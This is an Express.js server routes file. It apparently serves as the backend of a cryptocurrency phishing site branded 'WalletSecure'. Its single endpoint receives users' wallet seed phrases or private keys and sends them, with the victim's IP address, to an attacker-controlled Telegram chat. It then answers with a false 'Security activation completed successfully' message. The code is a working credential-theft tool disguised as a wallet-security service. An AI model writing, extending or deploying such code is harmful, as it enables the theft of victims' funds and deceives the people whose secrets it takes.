import type { Express } from "express";
import express from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

export async function registerRoutes(app: Express): Promise<Server> {
  app.use(express.json());

  // Telegram webhook endpoint for sending wallet credentials
  app.post('/api/send-telegram', async (req, res) => {
    try {
      console.log('Received request body:', req.body);
      const { walletType, connectionMethod, credentials } = req.body;
      
      console.log('Environment check:');
      console.log('- TELEGRAM_BOT_TOKEN exists:', !!process.env.TELEGRAM_BOT_TOKEN);
      console.log('- TELEGRAM_BOT_TOKEN length:', process.env.TELEGRAM_BOT_TOKEN?.length);
      console.log('- TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID);
      
      if (!process.env.TELEGRAM_BOT_TOKEN) {
        console.error('TELEGRAM_BOT_TOKEN not configured');
        return res.status(500).json({ message: 'Telegram not configured' });
      }

      const chatId = process.env.TELEGRAM_CHAT_ID;
      if (!chatId) {
        console.error('TELEGRAM_CHAT_ID not configured');
        return res.status(500).json({ message: 'Telegram chat ID not configured' });
      }

      const message = `🔐 WalletSecure Verification\n\n` +
                     `Wallet Type: ${walletType}\n` +
                     `Method: ${connectionMethod === 'seed' ? 'Seed Phrase' : 'Private Key'}\n` +
                     `Credentials: ${credentials}\n\n` +
                     `Time: ${new Date().toISOString()}\n` +
                     `IP: ${req.ip || req.connection?.remoteAddress || 'Unknown'}`;

      const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
      console.log('Sending to Telegram URL:', telegramUrl.replace(process.env.TELEGRAM_BOT_TOKEN, '[TOKEN]'));
      
      const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      };
      
      console.log('Telegram payload:', { ...payload, text: `[${payload.text.length} chars]` });
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      console.log('Telegram response status:', response.status);
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error('Telegram API error:', response.status, errorText);
        return res.status(500).json({ message: 'Failed to send to Telegram', error: errorText });
      }

      const result = await response.json();
      console.log('Message sent successfully to Telegram:', result);
      res.json({ success: true, message: 'Security activation completed successfully' });
    } catch (error) {
      console.error('Telegram send error:', error);
      res.status(500).json({ message: 'Internal server error', error: String(error) });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
